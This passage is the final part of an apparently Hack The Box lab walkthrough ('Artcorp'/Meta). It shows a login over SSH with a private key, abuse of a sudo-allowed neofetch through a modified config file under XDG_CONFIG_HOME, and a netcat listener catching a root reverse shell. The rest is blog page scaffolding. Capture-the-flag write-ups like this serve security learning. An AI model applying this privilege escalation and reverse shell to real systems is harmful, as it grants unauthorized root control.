+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -i id_rsa thomas@10.10.11.140</span><br><span class="line">Linux meta 4.19.0-17-amd64 <span class="comment">#1 SMP Debian 4.19.194-3 (2021-07-18) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">thomas@meta:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> thomas on meta:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,</span><br><span class="line">    env_keep+=XDG_CONFIG_HOME</span><br><span class="line"></span><br><span class="line">User thomas may run the following commands on meta:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/neofetch \&quot;\&quot;</span><br><span class="line">thomas@meta:~$ </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">thomas@meta:~$ <span class="built_in">export</span> XDG_CONFIG_HOME=<span class="string">&quot;<span class="variable">$HOME</span>/.config&quot;</span></span><br><span class="line">thomas@meta:~$ <span class="built_in">ls</span> -all</span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x 5 thomas thomas 4096 Jun  7 13:57 .</span><br><span class="line">drwxr-xr-x 3 root   root   4096 Aug 29  2021 ..</span><br><span class="line">lrwxrwxrwx 1 root   root      9 Aug 29  2021 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 thomas thomas  220 Aug 29  2021 .bash_logout</span><br><span class="line">-rw-r--r-- 1 thomas thomas 3526 Aug 29  2021 .bashrc</span><br><span class="line">drwxr-xr-x 3 thomas thomas 4096 Aug 30  2021 .config</span><br><span class="line">drwx------ 3 thomas thomas 4096 Jun  7 13:57 .gnupg</span><br><span class="line">-rw-r--r-- 1 thomas thomas  807 Aug 29  2021 .profile</span><br><span class="line">drwx------ 2 thomas thomas 4096 Jan  4 10:22 .ssh</span><br><span class="line">-rw-r----- 1 root   thomas   33 Jun  7 12:36 user.txt</span><br><span class="line">thomas@meta:~$ <span class="built_in">cd</span> .config/</span><br><span class="line">thomas@meta:~/.config$ <span class="built_in">ls</span></span><br><span class="line">neofetch</span><br><span class="line">thomas@meta:~/.config$ <span class="built_in">cd</span> neofetch/</span><br><span class="line">thomas@meta:~/.config/neofetch$ <span class="built_in">ls</span></span><br><span class="line">config.conf</span><br><span class="line">thomas@meta:~/.config/neofetch$ vim config.conf </span><br><span class="line">thomas@meta:~/.config/neofetch$ sudo -u root /usr/bin/neofetch \&quot;\&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvnp 1337 </span><br><span class="line">listening on [any] 1337 ...</span><br><span class="line">connect to [10.10.16.8] from (UNKNOWN) [10.10.11.140] 34908</span><br><span class="line">root@meta:/home/thomas/.config/neofetch<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">config.conf</span><br><span class="line">root@meta:/home/thomas/.config/neofetch<span class="comment"># cd ~</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">root@meta:~<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">conf</span><br><span class="line">root.txt</span><br><span class="line">root@meta:~<span class="comment"># cat root.txt</span></span><br></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Hack-The-Box/" class="category-chain-item">Hack The Box</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/" class="print-no-link">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTB Walkthrough - Artcorp</div>
+      <div>https://crazyinside.github.io/post/HackTheBox-Artcorp.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>World'sEnd</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 14, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Backdoor.html" title="HTB Walkthrough - Backdoor">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB Walkthrough - Backdoor</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Aragog.html" title="HTB Walkthrough - Aragog">
+                        <span class="hidden-mobile">HTB Walkthrough - Aragog</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
